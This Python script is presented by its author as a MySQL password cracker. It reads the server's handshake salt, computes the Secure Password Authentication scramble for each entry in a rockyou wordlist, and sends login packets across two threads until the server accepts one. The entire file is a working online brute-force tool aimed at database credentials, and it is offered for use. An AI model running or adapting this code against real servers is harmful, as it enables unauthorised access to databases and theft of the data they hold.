# Python3 compatible
# Mysql password cracker, works with Secure Password Authentication algorithm
# https://dev.mysql.com/doc/internals/en/secure-password-authentication.html
# Nov 2020
# Author: Ivica Stipovic
# Sidenote: make sure you do not have "skip-grant-tables" in your my mySql config file
# If you do, any connect attempt will return OK server response / will allow anonymous access
# This code is functionally relative close to the Metasploit auxiliary/scanner/mysql_login module

import socket
import sys
import time
import timeit
import struct
from hashlib import sha1
import mmap
import threading

pass_found=0

def calculation(username_binary, TCP_IP,TCP_PORT):
	
#Iterate through the passwords, make hash out of each one
# The biggest issue is that network sockets don't fit with CUDA - Device IO communication is not managed by CUDA
# Network sockets probably require multithreading with CPU
					
		dbversion=0

		for line in iter(m.readline,b""):

			sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
			sock.connect((TCP_IP,TCP_PORT))
			version,addr=sock.recvfrom(1024)
    
			payload_len=version[0]
			ver_offset=5
			version_len=0
			a=0
			
			while(version[a+ver_offset]!=0):
				version_len+=1
				a+=1

			if dbversion==0:
				print ("[+] Database version =", version[5:5+version_len].decode('utf-8'))
				dbversion=1

# You must calculate the version string length to get to salts
# move to 6th byte of the response and loop until first \00 terminator
# Count the bytes and calculate len of the Version field

			salt1=version[10+version_len:18+version_len]        # -1 to cut off null terminator
			salt2=version[37+version_len:49+version_len]        # -1 to cut off null terminator

			salt=salt1+salt2
			salt3=bytearray()
			salt3.extend(salt)
    
			line2=line.rstrip()
				
			datalen=int(55+len(username_binary))
			datalen2=datalen.to_bytes(3,'little')               

# hash=SHA1(password) XOR SHA1(s+SHA1(SHA1(password))), s=salt of 20 bytes
			bytes1 = sha1(line2).digest()
   
			concat1 = salt3
			concat2 = sha1(sha1(line2).digest()).digest()
 
			bytes3=bytearray()
			concat=concat1+concat2
			bytes3.extend(concat)
			bytes3=sha1(bytes3).digest()
     
			hash=bytearray(x ^ y for x, y in zip(bytes1, bytes3))
			pass_hash=hash
    
			data=datalen2                                          # Ensure length field is 3 bytes (hence +\x00\x00)
			data +=b'\x01'                                         # packet number=1
			data +=b'\x0d\xa2'                                     # Client capabilities -> careful with that!!
			data +=b'\x00\x00'                                     # Extended capabilities=0
			data +=b'\x00\x00\x00\x40'                             # Max size
			data +=b'\x08'                                         # Charset=8 latin1
			data +=b'\x00' *23                                     # 23 bytes are reserved=0
			data +=username_binary                                 # Username (from input parameter) with 00 termination 
			data +=b'\x00'                                         # Username NULL terminator
			data +=b'\x14'                                         # Not documented and wireshaek has no idea what this is!!
			data +=pass_hash
			data +=b'\x00'

			sock.sendall(data)
			authcode,addr=sock.recvfrom(1024)
			
			if authcode[5]==0:
				print ("[+] Password found:",line2)
				sock.close()
		
			sock.close()

		
# End of function/subroutine

if len(sys.argv)!=3:

    print ("Usage: python {} <ip address> <username>".format(sys.argv[0]))
    sys.exit()

TCP_IP          =sys.argv[1]
username        =sys.argv[2]
username_binary =username.encode('utf-8')
TCP_PORT        =3306
data_calculated=b""

start = timeit.default_timer()

# we're doing memory mapped file search to speed up stuff
# Start of the subroutine/function

with open("rockyou2.txt","rb") as f:
		m=mmap.mmap(f.fileno(),length=0,access=mmap.ACCESS_READ)  
		passx=m.readline().rstrip()

#Multithreading
		t1=threading.Thread(target=calculation,args=(username_binary,TCP_IP,TCP_PORT,))
		t2=threading.Thread(target=calculation,args=(username_binary,TCP_IP,TCP_PORT,))
	
		t1.start()
		t2.start()

#Wait for threads to finish
		
		t1.join()
		t2.join()
		stop = timeit.default_timer()
		execution_time = stop - start

		print("[+] Program Executed in "+str(execution_time))
					
			




        
